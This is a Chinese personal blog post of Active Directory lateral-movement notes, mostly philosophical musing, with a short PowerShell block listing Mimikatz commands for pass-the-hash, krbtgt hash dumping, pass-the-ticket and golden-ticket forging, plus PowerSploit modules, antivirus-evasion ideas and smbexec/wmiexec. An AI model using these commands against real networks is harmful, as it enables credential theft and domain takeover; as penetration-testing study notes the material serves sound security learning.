---
title: 'AD DC, 一点横向的笔记'
date: 2021-10-28 18:01:59
tags: Domain stuff
---

# AD-DC,一点横向笔记。

会更新的，如果我在那时还活着而且有心情摸鱼的话。
如果有横向笔记的话，竖向笔记作为一个概念的外延和实体化，
存在吗?

无论如何，我不会把所有东西统统一股脑丢在这篇文章里面。
有些内容值得一篇单独的文章，而另一些让我更倾向于选择-把它们留在心里。
所以我的记忆也不是那么差，对吧？

##### PREFACE

​		所以我也许真的记不下来，那么就把这玩意当成笔记好了。激情是如此奇妙的东西，以致于我在这里写这些内容的时候竟无法停止睡觉，喝一杯咖啡或者打打游戏的冲动。人类是非理性的动物，我常说。

​		但是世界上有如此多的诱惑，和更多的fuck-ups.我要如何不因为这种简单的原因毁掉我的一天呢?

​		于是我又想到了时间，每个微秒间的微分函数和原子的震动。我感到迷茫，因为时间总是以如此的节律流逝，以发条钟的滴答声为节律流逝，以聚乙烯和聚乙烯的碰撞声为节律流逝，以白噪声信号的上升沿和下降沿为节律流逝，就如手中的沙和我口边的雾气，我可以感知，但又无法度量。我为时间而感到迷茫，我为一切可能性而感到迷茫，我为存在而感到迷茫，而这...

​		对天发誓(God forsaken)，我不想写下去了。

​		我想，这是对时间的一种浪费也是对过去的我的不尊重，但是我还是写着，写着，写着。

##### CMDLets

"So let's call it cmdlets, eh?"

```powershell
# 我不会在这里写那些基础的玩意，反正你们知道AD是什么玩意，林是什么玩意域是什么玩意TGT是什么AS是什么Kerberos是什么。
# 我甚至不期待有什么人来看。
# 我只期待我能学到什么，或者记住什么。


```

So there's this thing. We use all forms of digital or analog devices and turn them the extension of our memories.
And the machine has memories.
But where's ours?

​		所以问题来了。我们用一切矢量与数码的设备作为我们的记忆外延。
​		所以机器拥有了记忆。
​		但是我们的记忆在哪里?

##### TOOLs

"Those that goes downwards. Simplifies the job anyway."

​		接下来是形而上和形而下。我们成那些形而下的存在为器，或者[工具]，然而器也有其形而上的用途。
​		而人类从更长的时间长河里，是某种工具。
​		我们是形而上的，还是形而下的，或者两者？

```powershell
# Mimikatz
# 一件事情。这玩意在各种地方被乱杀成筛子，所以pypykatz+py2exe解决方案没准有用。你问我？我不擅长C++，而且不知道该写什么。
	# 我知道你们都知道怎么把lsass dump下来，找到ntlm，或者搞到明文密码了，对吧?
	# ...对吧?
# 但是不得不说，记下工具的命令而不是原理让我倍感堵得慌。给人一种"我是skid"的错觉。但是有多少"so called security expert"不是？而且我的C是真的拉胯。
# 我会发一篇关于类似"发出一篇如何复刻mimikatz而且橄榄所有AV的文章有没有搞错"之类的文章的。迟早。
sekurlsa::minidump {fname} # Switch to minidump
sekurlsa::pth /user {uname} /domain {domain_name} /ntlm:{ntlm} /run:{exec} # PTH. 它支持各种长度的ntlm,和aes256。
sekurlsa::krbtgt # Krbtgt Hash
kerberos::ptt {kirbi} # PTT。
kerberos::golden /admin:{admin_ame} /domain:{domain} id:{rid} /sid:{sid} krbtgt:{krb_hash} /ptt # Golden ticket
ts::multirdp # 使得一个RDP session可以被多个用户操作。

# Powersploit
# 在内网机器上的文件Invoke-Request系配合IEX也许很方便。Ignore me, I'm just hungry, and I don't know what I'm talking about.
O
# Metasploit(WHY?)

# Invoke-WmiCommand
# Add-Persistance
# Invoke-TokenManipulation
# Set-CriticalProcess
# Powerup
# Invoke-Portscan
# Powerview
# Misc
	#票子。金票->TGT，银票-ST。 
Ticker+py2exe系?
smbexec
wmiexec

```



##### Other

困了，也许我会更新，也许我不会。
